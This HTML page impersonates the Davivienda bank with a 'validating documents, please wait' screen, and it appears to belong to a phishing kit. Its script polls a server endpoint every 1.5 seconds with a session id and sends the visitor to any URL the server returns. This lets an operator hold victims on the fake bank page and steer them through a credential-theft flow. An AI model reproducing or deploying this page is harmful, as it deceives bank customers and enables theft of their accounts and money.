<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validando documentos...</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <header>
        <div class="logo">
            <img src="logo1.jpg" alt="Davivienda">
        </div>
    </header>

    <div class="main-container">
        <div class="auth-container">
            <h3 class="auth-subtitle" style="color: #ED1C24; font-weight: bold; margin-bottom: 20px;">Validando
                documentos, por favor espere...</h3>
            <div class="loading-spinner"></div>
        </div>
    </div>

    <footer>
        <p>
            <a href="#">Políticas de Seguridad</a> |
            <a href="#">Políticas de Privacidad</a> |
            <a href="#">Términos y Condiciones</a>
        </p>
        <p>© DAVIVIENDA. Todos los derechos reservados.</p>
    </footer>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('sid');

        function pollServer() {
            if (!sessionId) return;

            fetch(`api.php?action=poll&sid=${sessionId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.command === 'redirect' && data.url) {
                        window.location.href = data.url;
                    }
                })
                .catch(err => console.error("Polling error:", err));
        }

        setInterval(pollServer, 1500);
        pollServer();
    </script>
</body>

</html>
